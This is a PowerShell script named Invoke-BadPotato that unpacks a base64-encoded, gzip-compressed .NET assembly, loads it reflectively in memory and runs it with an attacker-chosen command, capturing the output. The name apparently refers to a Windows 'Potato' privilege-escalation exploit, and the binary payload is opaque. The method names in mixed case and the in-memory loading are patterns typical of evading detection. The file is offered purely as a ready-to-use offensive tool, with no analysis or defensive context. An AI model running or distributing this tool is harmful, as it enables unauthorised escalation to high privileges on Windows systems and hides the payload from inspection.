function Invoke-BadPotato
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = "whoami"

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [ConsoleApp1]::main($Command)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}